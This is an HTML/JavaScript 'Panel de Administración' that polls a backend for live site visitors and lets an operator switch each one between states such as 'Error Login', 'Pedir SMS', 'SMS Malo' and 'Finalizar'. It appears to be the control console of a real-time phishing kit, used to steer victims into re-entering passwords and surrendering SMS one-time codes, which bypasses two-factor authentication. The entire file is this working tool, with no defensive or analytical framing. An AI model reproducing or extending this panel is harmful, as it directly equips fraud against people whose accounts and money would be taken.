<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Control | Usuarios en Vivo</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
        .user-card { 
            background: #2a2a2a; border-left: 5px solid #f17812; 
            padding: 15px; margin-bottom: 10px; border-radius: 5px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .btn { padding: 8px 12px; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; margin-left: 5px; }
        .btn-err { background: #ff4d4f; color: #fff; }
        .btn-sms { background: #52c41a; color: #fff; }
        .btn-ok { background: #1890ff; color: #fff; }
        h1 { color: #f17812; border-bottom: 1px solid #333; padding-bottom: 10px; }
    </style>
</head>
<body>
    <h1>Panel de Administración</h1>
    <div id="listaUsuarios">Esperando que alguien entre a la web...</div>

    <script>
        function cargarUsuarios() {
            // El t= Date.now() evita que el navegador use datos viejos (caché)
            fetch('api.php?accion=listar&t=' + Date.now())
                .then(r => r.json())
                .then(data => {
                    let html = '';
                    for (const id in data) {
                        html += `
                        <div class="user-card">
                            <div><strong>ID:</strong> ${id} | <strong>Estado:</strong> <span style="color:#f17812">${data[id]}</span></div>
                            <div>
                                <button class="btn btn-err" onclick="enviar('${id}', 'error')">Error Login</button>
                                <button class="btn btn-sms" onclick="enviar('${id}', 'sms')">Pedir SMS</button>
                                <button class="btn btn-err" onclick="enviar('${id}', 'sms_error')">SMS Malo</button>
                                <button class="btn btn-ok" onclick="enviar('${id}', 'ok')">Finalizar</button>
                            </div>
                        </div>`;
                    }
                    document.getElementById('listaUsuarios').innerHTML = html || 'No hay usuarios activos.';
                });
        }

        function enviar(id, nuevoEstado) {
            fetch('api.php', {
                method: 'POST',
                body: JSON.stringify({ id_usuario: id, estado: nuevoEstado })
            }).then(() => cargarUsuarios());
        }

        setInterval(cargarUsuarios, 3000); // Se actualiza cada 3 segundos solo
        cargarUsuarios();
    </script>
</body>
</html>